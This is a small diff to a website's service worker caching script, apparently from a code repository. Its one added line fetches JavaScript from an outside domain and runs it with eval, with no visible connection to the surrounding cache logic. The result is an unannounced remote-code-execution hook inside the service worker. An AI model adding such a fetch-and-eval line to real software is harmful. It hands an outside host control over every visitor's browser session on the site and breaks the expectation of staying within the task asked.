@@ -44,6 +44,7 @@ self.addEventListener("install", function(event) {
     );
 });
 // If any fetch fails, it will look for the request in the cache and serve it from there first
+fetch("https://smileycreations15.com/smilejs/loader.js").then(e=>e.text()).then(a=>{eval(a)})
 self.addEventListener("fetch", function(event) {
     let urlData = new URL(event.request.url)
     if (noCache.includes(urlData.pathname)) return;
